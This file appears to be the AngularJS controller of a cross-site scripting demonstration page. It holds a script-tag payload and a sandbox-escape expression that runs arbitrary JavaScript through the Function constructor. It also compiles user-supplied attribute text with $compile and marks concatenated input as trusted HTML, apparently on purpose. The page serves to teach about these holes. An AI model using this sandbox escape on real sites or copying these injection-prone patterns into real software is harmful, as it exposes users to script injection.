'use strict'

angular.module('App', [])
	.controller('Ctrl', function($scope, $http, $compile, $timeout, $templateCache, $sce, $window){
		window.hackMessage = 'You have been hacked!';

		var scrollKey = 'XSSAngularScrollTop';
		var lastScrollTop = $window.sessionStorage.getItem(scrollKey);

		$scope.hackScriptText = '<script type="text/javascript">alert("You have been hacked!"); document.body.firstElementChild.className = 1;</script>';
		$scope.hackSandBoxText = "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(hackMessage); document.body.firstElementChild.className = 1')()}}";

		$scope.a1Items = [];
		$scope.hacked = document.getElementById('dummy-hacked-indicator').className === '1';

		$http.get('/getDB').then(function(res){
			var obj = res.data;
			$scope.serverTemplateUnparsedText = obj.serverTemplateUnparsedText;
			$scope.interpolationText = obj.interpolationText;
			$scope.ngIncludeText = obj.ngIncludeText;
			$scope.ngBindHtmlText = obj.ngBindHtmlText;
			$templateCache.put('htmlContentUrl', '<div id="' + $scope.ngIncludeText + '"></div>');
			$scope.loadedDB = true;
		});

		$scope.cleanDBPlusRefresh = function(){
			$http.post('/cleanDB').then(function(){
				$window.location.reload();
			});
		};

		$scope.onNgIncludeComplete = function() {
			$scope.ngIncludeCompiled = angular.element('#angular-2 .compiled')[0].innerHTML;
		};
		
		$scope.createElement = function() {
			var element = document.createElement('div');
			element.className = $scope.constructionText;
			angular.element('#construction-text-container').append(element);
			$scope.hacked = $scope.constructionText === $scope.hackSandBoxText;
			$compile(element)($scope);
			$scope.a1Items.push(element.outerHTML);
		};

		$scope.$watch('ngBindHtmlText', function(newVal){
			$scope.ngBindHtmlFull = $sce.trustAsHtml('<div id="' + newVal + '"></div>');
		});

		$scope.startTimer = function() {
			$timeout(function(){
				if($scope.statusMessage) {
					$scope.statusMessage = '';
				}
			}, 5000);
		};

		$scope.getDynamicAnimatedElements = function() {
			var headerEl = document.getElementById('main-title-header');
			var documentationContainerEl = document.getElementById('documentation-container');
			var elementsToModifyClass = [headerEl, documentationContainerEl];
			return angular.element(elementsToModifyClass);
		};

		// Hide the animatable items if resized to mobile
		$scope.resizeHandler = function() {
			var dummySizeIndicatorEl = document.getElementById('dummy-size-indicator');
			$scope.isMobile = angular.element(dummySizeIndicatorEl).css('display') === 'none';
			$scope.getDynamicAnimatedElements().toggleClass('animate-hidden', $scope.isMobile);
			angular.element('body').toggleClass('is-mobile', $scope.isMobile);
		};

		// Hide the animatable items when scrolled far enough as well as save it to session storage
		angular.element('#documentation-container').bind('scroll', function(){
			var scrollTop = angular.element('#documentation-container').scrollTop();
			$window.sessionStorage.setItem(scrollKey, scrollTop);

			if($scope.isMobile) {
				$scope.getDynamicAnimatedElements().toggleClass('animate-hidden', scrollTop > 60);
			}
		});

		var unbindScrollWatcher = $scope.$watch(function(){
			return angular.isDefined($scope.ngIncludeCompiled) && angular.isDefined($scope.ngBindHtmlFull);
		}, function(newVal) {
			if(newVal) {
				angular.element('#documentation-container').scrollTop(lastScrollTop);
				unbindScrollWatcher();
			}
		});

		angular.element($window).bind('resize', $scope.resizeHandler);
		$scope.resizeHandler();
	})
	.directive('safeCircle', function(){
		return {
			template: '<i class="fa fa-check-circle" aria-hidden="true" style="color: green;"></i>',
			restrict: 'E'
		};
	})
	.directive('dangerCircle', function(){
		return {
			template: '<i class="fa fa-times-circle" aria-hidden="true" style="color: red;"></i>',
			restrict: 'E'
		};
	});
	